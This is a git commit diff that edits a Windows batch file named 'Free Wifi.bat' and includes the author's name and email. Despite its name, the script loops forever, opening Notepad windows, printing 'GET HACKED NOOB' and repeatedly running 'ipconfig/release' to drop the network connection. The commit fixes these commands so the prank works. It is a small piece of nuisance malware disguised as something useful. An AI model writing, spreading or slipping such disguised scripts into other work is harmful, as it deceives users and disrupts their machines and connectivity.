94c6b60dcdb5788e58d474b877f52bf22e5323ce
NotTimIsReal <alastairrintumathew@gmail.com>
2021-06-07 13:46:35 +1000

    stuff

--- Free Wifi.bat
+++ Free Wifi.bat
@@ -1,8 +1,8 @@
 @ECHO off
 
  :top
- START %SystemRoot%\system32\terminal.exe
+ START %SystemRoot%\system32\notepad.exe
  echo GET HACKED NOOB
  echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
-Ip/release
+ipconfig/release
  GOTO top
